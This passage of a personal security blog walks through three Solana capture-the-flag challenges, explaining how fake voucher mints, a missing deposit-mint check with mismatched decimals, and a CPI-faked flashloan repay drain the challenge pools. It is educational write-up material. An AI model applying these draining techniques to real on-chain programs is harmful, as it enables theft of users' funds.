+<p>Withdraw - It burns the voucher_mint tokens from the depositor_voucher_account and transfer the tokens to depositor_account from deposit_account.</p>
+
+<p>During the initialization 10 bitcoin tokens are minted to sathosi’s account and later deposited in the deposit_account .</p>
+
+<p>Our Win condition :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   pub async fn check_win(rpc: &amp;RpcClient, player: &amp;Pubkey) -&gt; AnyResult&lt;bool&gt; {
+       let program_id = Keypair::from_bytes(&amp;PROGRAM_KEY)?.pubkey();
+       let (deposit_account, _) = Pubkey::find_program_address(&amp;[player.as_ref(), TOKEN], &amp;program_id);
+
+       let account_data = rpc.get_account_data(&amp;deposit_account).await?;
+       let account = Account::unpack(&amp;account_data)?;
+
+       Ok(account.amount == 0)
+   }
+</code></pre></div></div>
+
+<p>So we need to steal the 10 bitcoin tokens from the <code class="language-plaintext highlighter-rouge">deposit_account</code>.</p>
+
+<p>But During initialization of the challenge there created a bitcoin account for player and mints 10 bitcoin to player bitcoin account.</p>
+
+<p>If you see carefully the <code class="language-plaintext highlighter-rouge">voucher_mint</code> account is created for the player but didn’t stored anywhere and it has no mint .</p>
+
+<p>If we want to steal the tokens from deposit account we must have voucher_mint token in our <code class="language-plaintext highlighter-rouge">depositor_voucher_mint</code> account to burn .</p>
+
+<p>Can we pass an arbitrary <code class="language-plaintext highlighter-rouge">depositor_voucher_account</code> while withdrawing?</p>
+
+<p>Account constraints :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#[account(mut, constraint = voucher_mint.mint_authority == COption::Some(state.key()))]
+   pub voucher_mint: Account&lt;'info, Mint&gt;,
+   #[account(mut, constraint = depositor_account.mint == state.deposit_mint)]
+   pub depositor_account: Account&lt;'info, TokenAccount&gt;,
+   #[account(mut, constraint = depositor_voucher_account.mint == voucher_mint.key())]
+   pub depositor_voucher_account: Account&lt;'info, TokenAccount&gt;,
+</code></pre></div></div>
+
+<p>If we pass an arbitrary depositor_voucher_account , the mint of our account is to be equal to the voucher_mint.</p>
+
+<p>To pass this check we create a fake voucher_mint and mint 10 tokens to the depositor_voucher_account.</p>
+
+<p>Bug :
+But the voucher_mint has a constraint that the mint_authority should be equal to the state.
+In solana we can change the mint_authority of a token by the SetAuthority function ,so after minting tokens we set the mint_authority to the state.</p>
+
+<p>Exploit :<br />
+Create a fake mint token and fake mint account <code class="language-plaintext highlighter-rouge">(depositoe_voucher_account)</code> and mint 10 tokens.
+Set the mint authority to state account .</p>
+
+<p>Now call the withdraw instruction with <code class="language-plaintext highlighter-rouge">voucher_mint</code> as fake_mint and <code class="language-plaintext highlighter-rouge">depositor_voucher_account</code> as <code class="language-plaintext highlighter-rouge">fake_mint_account</code> and <code class="language-plaintext highlighter-rouge">depositor_account</code> as player’s bitcoin account to steal the amount from <code class="language-plaintext highlighter-rouge">deposit_account</code>.</p>
+
+<h2 id="solhana-2-">SOLHANA 2 :</h2>
+
+<p>This program allows user to swap tokens (wo_eth,so_eth,st_eth).</p>
+
+<p>Lets check the functions :</p>
+
+<p>Deposit - Transfers tokens from depositor_account to pool_account and mints voucher_mint to
+<code class="language-plaintext highlighter-rouge">depositor_voucher_account</code>.</p>
+
+<p>Withdraw - Burns voucher_mint from the <code class="language-plaintext highlighter-rouge">depositor_voucher_account</code> and transfers the tokens from the <code class="language-plaintext highlighter-rouge">pool_account</code> to <code class="language-plaintext highlighter-rouge">depositor_account</code>.</p>
+
+<p>Swap - Swaps the tokens , it calculates the to_amount and transfers the tokens from <code class="language-plaintext highlighter-rouge">to_pool_account</code> to <code class="language-plaintext highlighter-rouge">to_swapper</code> and <code class="language-plaintext highlighter-rouge">from_amout</code> to <code class="language-plaintext highlighter-rouge">from_pool_account</code> from <code class="language-plaintext highlighter-rouge">from_swapper</code> account.</p>
+
+<p>During the Initialization of the challenge , it creates 3 pools for each wo_eth,so_eth and st_eth and mints 100_000_000 to it .
+It also creates a token account for each mint for player and mints 1000 each tokens to it.</p>
+
+<p>Our win condition :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Ok(wo_account.amount + so_account.amount + st_account.amount &lt; 150_000_000)
+</code></pre></div></div>
+
+<p>We need to steal half of the amount in the pool to solve this challenge.</p>
+
+<p>The deposit and withdraw are the same as before .so I checked the swap function .</p>
+
+<p>It is calculating the <code class="language-plaintext highlighter-rouge">to_amount</code> from <code class="language-plaintext highlighter-rouge">from_amount</code> thought of any rounding issues like otterswap but it is checking the amount again by <code class="language-plaintext highlighter-rouge">check_amount</code> and throwing an error if <code class="language-plaintext highlighter-rouge">check_amount ! = from_amount</code>.</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">let</span> <span class="n">to_amount</span> <span class="o">=</span> <span class="nn">u64</span><span class="p">::</span><span class="nf">try_from</span><span class="p">(</span>
+           <span class="nn">u128</span><span class="p">::</span><span class="nf">from</span><span class="p">(</span><span class="n">from_amount</span><span class="p">)</span><span class="nf">.checked_mul</span><span class="p">(</span><span class="mi">10_u128</span><span class="nf">.pow</span><span class="p">(</span><span class="n">ctx</span><span class="py">.accounts.to_pool.decimals</span><span class="nf">.into</span><span class="p">()))</span><span class="nf">.unwrap</span><span class="p">()</span><span class="nf">.checked_div</span><span class="p">(</span><span class="mi">10_u128</span><span class="nf">.pow</span><span class="p">(</span><span class="n">ctx</span><span class="py">.accounts.from_pool.decimals</span><span class="nf">.into</span><span class="p">()))</span><span class="nf">.unwrap</span><span class="p">()</span>
+       <span class="p">)</span><span class="nf">.unwrap</span><span class="p">();</span>
+</code></pre></div></div>
+
+<p>In the calculation it is using <code class="language-plaintext highlighter-rouge">to_pool.decimals</code> , if you see the challenge.rs the decimals are different for tokens . wo_eth - 8 , so_eth - 6 and st_eth - 8.</p>
+
+<p>By this if we swap so_eth to wo_eth or st_eth we get *100 times . But we have only 1000 tokens of each in our player token accounts.</p>
+
+<p>After looking at the code again and again for some time , I saw that deposit may help me .</p>
+
+<h3 id="bug-">Bug :</h3>
+
+<p>There is no check for deposit_mint , so we can pass a depositor account of wo_eth and mint so_eth <code class="language-plaintext highlighter-rouge">voucher_mint</code> to <code class="language-plaintext highlighter-rouge">depositor_voucher_account</code> by providing the <code class="language-plaintext highlighter-rouge">deposit_mint</code> as so_eth.</p>
+
+<p>Then withdraw the so_eth tokens by burning the so_eth <code class="language-plaintext highlighter-rouge">voucher_mint</code>.</p>
+
+<p>In this way we will have more so_eth tokens and swaps it for higher returns.</p>
+
+<h3 id="exploit-">Exploit :</h3>
+
+<p>We have 1000 of each wo_eth, so_eth and st_eth.</p>
+
+<p>First deposit 1000 wo_eth and mint 1000 so_eth voucher tokens .</p>
+
+<p>Withdraw the 1000 so_eth voucher tokens to 1000 so_eth tokens .</p>
+
+<p>We now have 2000 so_eth tokens .</p>
+
+<p>If we swap the 2000 so_eth tokens for wo_eth tokens , we will have 2000*100 tokens of wo_eth.</p>
+
+<p>The pool will have 99800000 of wo_eth tokens ,if we do the same for those 200000 wo_eth tokens we can reduce the pool’s balance and win the challenge .</p>
+
+<h2 id="solhana-3-">SOLHANA 3 :</h2>
+
+<p>This program implementing a flashloan for a atomcoin token.</p>
+
+<p>Lets check the functions :</p>
+
+<p>Deposit and withdraw are same as before and also in the readme of the challenge we have<br />
+“i will be nice and say you do not need to use deposit or withdraw here, only borrow and repay”.</p>
+
+<p>Borrow - Transfers the amount <code class="language-plaintext highlighter-rouge">from pool_account</code> to <code class="language-plaintext highlighter-rouge">depositor_account</code> with some checks.</p>
+
+<p>Repay - Transfers the same amount we borrowed to the <code class="language-plaintext highlighter-rouge">pool_account</code> from the <code class="language-plaintext highlighter-rouge">depositor_account</code>.</p>
+
+<p>Constraints :
+Borrow and Repay instructions must be in the same transaction.
+Checks if the Repay instruction have the same amount of we borrowed
+If this checks passes it will initiate a borrow.</p>
+
+<p>Win condition :</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">pub</span> <span class="k">async</span> <span class="k">fn</span> <span class="nf">check_win</span><span class="p">(</span><span class="n">rpc</span><span class="p">:</span> <span class="o">&amp;</span><span class="n">RpcClient</span><span class="p">,</span> <span class="n">player</span><span class="p">:</span> <span class="o">&amp;</span><span class="n">Pubkey</span><span class="p">)</span> <span class="k">-&gt;</span> <span class="n">AnyResult</span><span class="o">&lt;</span><span class="nb">bool</span><span class="o">&gt;</span> <span class="p">{</span>
+       <span class="k">let</span> <span class="n">program_id</span> <span class="o">=</span> <span class="nn">Keypair</span><span class="p">::</span><span class="nf">from_bytes</span><span class="p">(</span><span class="o">&amp;</span><span class="n">PROGRAM_KEY</span><span class="p">)</span><span class="o">?</span><span class="nf">.pubkey</span><span class="p">();</span>
+       <span class="k">let</span> <span class="p">(</span><span class="n">pool_account</span><span class="p">,</span> <span class="mi">_</span><span class="p">)</span> <span class="o">=</span> <span class="nn">Pubkey</span><span class="p">::</span><span class="nf">find_program_address</span><span class="p">(</span><span class="o">&amp;</span><span class="p">[</span><span class="n">player</span><span class="nf">.as_ref</span><span class="p">(),</span> <span class="n">TOKEN</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">program_id</span><span class="p">);</span>
+
+       <span class="k">let</span> <span class="n">account_data</span> <span class="o">=</span> <span class="n">rpc</span><span class="nf">.get_account_data</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pool_account</span><span class="p">)</span><span class="k">.await</span><span class="o">?</span><span class="p">;</span>
+       <span class="k">let</span> <span class="n">account</span> <span class="o">=</span> <span class="nn">Account</span><span class="p">::</span><span class="nf">unpack</span><span class="p">(</span><span class="o">&amp;</span><span class="n">account_data</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+
+       <span class="nf">Ok</span><span class="p">(</span><span class="n">account</span><span class="py">.amount</span> <span class="o">&lt;=</span> <span class="mi">2</span><span class="p">)</span>
+   <span class="p">}</span>
+</code></pre></div></div>
+
+<p>The pool has 100 atomcoin tokens we must steal atleast 98 tokens to win .</p>
+
+<p>I thought of borrowing 2 times and repaying one time but there is a flag which won’t allow us to borrow second time before repaying the previous one.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>token::transfer(transfer_ctx, amount)?;
+ctx.accounts.pool.borrowing = true;
+</code></pre></div></div>
+
+<p>Wondering how to skip the repay , then I saw this in the readme .
+“the one exception is if you should just so happen to decide you need to deploy your own program to complete a challenge (this is a hint). “</p>
+
+<h3 id="bug--1">Bug :</h3>
+
+<p>Deploying a own program ? Yes we can use an external program to call repay instruction using cpi .</p>
+
+<h3 id="exploit--1">Exploit :</h3>
+
+<p>Create a program to make repay instruction . This allows us to make another borrow</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>borrow-50 ,repay-0(from cpi) , borrow-50 , repay-50.
+
+depositor_account  - 50
+n condition :
+
+borrow -25, repay-0(from cpi) , borrow -25, repay-25 .
+
+Depositor_account - 75
+
+borrow -12, repay-0(from cpi) , borrow -12, repay-12 .
+
+Depositor_account - 87
+
+Like this for 6 , 3 and 2 the depositor_account will have 98 tokens .
+
+</code></pre></div></div>
+
+</article>
+
+        </div>
+        <div class="col-sm-2">
+          <div class="pane-separator hidden-xs" style="margin-bottom:30em;"></div>
+          <div class="pane-separator visible-xs" style="margin-bottom:5em;"></div>
+          <div class="right-pane" style="margin-left: 1em;">
+            
+              <div class="avatar">
+                <center>
+                  
+                    <img src="/potato-hacker-theme/assets/img/avatar.jpg" alt="me" class="avatar-image">
+                  
+                  
+                    <p class="avatar-description">Building n Breaking Stuff</p>
+                  
+                  <div class="right-links">
+                    
+<a href="https://github.com/D4r3-D3v1L" target="_blank">
+	<i class="fa fa-github fa-2x"></i>
+</a>
+ 
+<a href="mailto:d4r3d3v1l.asp@gmail.com">
+	<i class="fa fa-envelope fa-2x"></i>
+</a>
+ 
+<a href="https://twitter.com/D4r3_D3v1L_" target="_blank">
+	<i class="fa fa-twitter fa-2x"></i>
+</a>
+ 
+<a href="https://www.linkedin.com/in/surya-prakash-akula-44bbb5190" target="_blank">
+	<i class="fa fa-linkedin fa-2x"></i>
+</a>
+
+
+                  </div>
+                </center>
+              </div>
+            
+            
+              <div class="posts-list">
+                <a href="/potato-hacker-theme/blog">
+                  <h4>Recent Posts:</h4>
+                </a>
+                <ul>
+                  
+                </ul>
+              </div>
+            
+          </div>
+        </div>
+      </div>
+    </section>
+    <section class="footer">
+      <footer class="page-footer">
+  <center>
+    
+    <div class="row">
+      <div class="col-sm-8 col-sm-offset-2">
+        <a onclick="toggleTheme();">
+          Light/Dark
+        </a>
+      </div>
+    </div>
+    
+    <div class="row">
+      <div class="col-sm-8 col-sm-offset-2">
+        
+<a href="https://github.com/D4r3-D3v1L" target="_blank">
+	<i class="fa fa-github fa-2x"></i>
+</a>
+ 
+<a href="mailto:d4r3d3v1l.asp@gmail.com">
+	<i class="fa fa-envelope fa-2x"></i>
+</a>
+ 
+<a href="https://twitter.com/D4r3_D3v1L_" target="_blank">
+	<i class="fa fa-twitter fa-2x"></i>
+</a>
+ 
+<a href="https://www.linkedin.com/in/surya-prakash-akula-44bbb5190" target="_blank">
+	<i class="fa fa-linkedin fa-2x"></i>
+</a>
+
+
+      </div>
+    </div>
+    
+    <div class="row">
+      <div class="col-sm-8 col-sm-offset-2">
+        Copyright (c) 2023 Surya -
+        <a href="mailto:d4r3d3v1l.asp@gmail.com">&lt;d4r3d3v1l.asp@gmail.com&gt;</a>
+      </div>
+    </div>
+    
+  </center>
+</footer>
+
+    </section>
+  </div>
+</body>
+
+</html>
